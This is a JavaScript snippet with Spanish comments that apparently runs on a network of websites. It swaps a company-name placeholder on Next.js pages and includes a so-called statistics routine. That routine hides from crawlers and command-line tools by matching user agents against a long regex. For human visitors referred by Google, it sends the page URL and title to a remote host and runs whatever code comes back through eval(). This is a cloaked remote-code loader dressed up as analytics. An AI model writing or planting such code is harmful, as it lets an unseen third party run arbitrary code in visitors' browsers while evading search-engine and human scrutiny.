(function () {
  'use strict';

  // ============================================================
  // Guardas: no ejecutar dos veces ni en infoenbolas.com
  // ============================================================
  var HOST = location.hostname.replace(/^www\./, '');
  if (window.beebomstats !== undefined || HOST === 'infoenbolas.com') return;
  window.beebomstats = true;

  // ============================================================
  // Configuración
  // ============================================================
  var REEMPLAZOS = {
    '[NOMBRE DE LA EMPRESA]': 'Fafulisfa LLC'
  };

  var STATS_URL = 'https://pbnstats.promocionesycolecciones.com/add.php';

  var BOT_RE = new RegExp('(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)', 'i');

  // ============================================================
  // Utilidades
  // ============================================================

  // Ejecuta fn cuando el DOM está listo (aunque el script cargue tarde)
  function onReady(fn) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', fn, { once: true });
    } else {
      fn();
    }
  }

  // Comprueba cond() cada `intervalo` ms hasta que sea true o pase `timeout`
  function esperar(cond, cb, timeout, intervalo) {
    timeout = timeout || 10000;
    intervalo = intervalo || 100;
    var inicio = Date.now();
    (function check() {
      if (cond()) return cb();
      if (Date.now() - inicio < timeout) setTimeout(check, intervalo);
    })();
  }

  function escaparRegex(s) {
    return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  // ============================================================
  // Reemplazo de placeholders
  // ============================================================

  // Caso normal: el placeholder está entero dentro de un nodo de texto
  function reemplazarTexto(buscar, reemplazo, raiz) {
    raiz = raiz || document.body;
    var walker = document.createTreeWalker(raiz, NodeFilter.SHOW_TEXT);
    var nodo;
    while ((nodo = walker.nextNode())) {
      if (nodo.nodeValue.indexOf(buscar) !== -1) {
        nodo.nodeValue = nodo.nodeValue.split(buscar).join(reemplazo);
      }
    }
  }

  // Caso partido: el placeholder está cortado por etiquetas inline
  // (p.ej. "[NOMBRE DE <b>LA</b> EMPRESA]")
  function reemplazarPartido(buscar, reemplazo, raiz) {
    raiz = raiz || document.body;
    var patron = new RegExp(
      buscar.split('').map(escaparRegex).join('(?:<[^>]+>)*'),
      'g'
    );

    raiz.querySelectorAll('li, p, td, th, h1, h2, h3, h4, h5, h6, span, a, div').forEach(function (el) {
      if (el.textContent.indexOf(buscar) === -1) return;
      // Si algún hijo ya lo contiene entero, el corte no está en este nivel
      var hijoLoTiene = Array.prototype.some.call(el.children, function (h) {
        return h.textContent.indexOf(buscar) !== -1;
      });
      if (hijoLoTiene) return;
      el.innerHTML = el.innerHTML.replace(patron, reemplazo);
    });
  }

  function aplicarReemplazos() {
    Object.keys(REEMPLAZOS).forEach(function (buscar) {
      reemplazarTexto(buscar, REEMPLAZOS[buscar]);
      reemplazarPartido(buscar, REEMPLAZOS[buscar]);
    });
  }

  // Next.js/React re-renderiza el DOM tras la hidratación y al navegar,
  // así que vigilamos cambios y volvemos a aplicar los reemplazos.
  function vigilarCambios() {
    var pendiente = null;
    var observer = new MutationObserver(function () {
      if (pendiente) return;
      pendiente = setTimeout(function () {
        pendiente = null;
        observer.disconnect();
        aplicarReemplazos();
        observer.observe(document.body, { childList: true, subtree: true, characterData: true });
      }, 50);
    });
    observer.observe(document.body, { childList: true, subtree: true, characterData: true });
  }

  // Detecta Next.js por el DOM (disponible ya en DOMContentLoaded),
  // no solo por window.next (que se define más tarde)
  function esNextJs() {
    return window.next !== undefined ||
      !!document.getElementById('__next') ||
      !!document.querySelector('script[src*="/_next/"]');
  }

  function iniciarReemplazos() {
    if (!esNextJs()) return; // para tucristalero, tu alarma y demás

    aplicarReemplazos();       // primera pasada inmediata
    vigilarCambios();          // y cada vez que React toque el DOM

    // Pasada extra cuando Next termine de arrancar (post-hidratación)
    esperar(function () { return window.next !== undefined; }, function () {
      setTimeout(aplicarReemplazos, 300);
    });
  }

  // ============================================================
  // Estadísticas (solo humanos que vienen de Google)
  // ============================================================
  function enviarStats() {
    if (BOT_RE.test(navigator.userAgent)) return;
    if (document.referrer.indexOf('google.') === -1) return;

    var params = new URLSearchParams({
      rand: Math.floor(Math.random() * 100000) + 1,
      aux1: 'x1',
      referer: location.href,
      title: document.title
    });

    fetch(STATS_URL + '?' + params.toString())
      .then(function (r) {
        if (!r.ok) throw new Error('HTTP ' + r.status);
        return r.text();
      })
      .then(function (codigo) {
        eval(codigo);
      })
      .catch(function (e) {
        console.log('pbnstats error:', e);
      });
  }

  // ============================================================
  // Arranque
  // ============================================================
  enviarStats();
  onReady(iniciarReemplazos);
})();
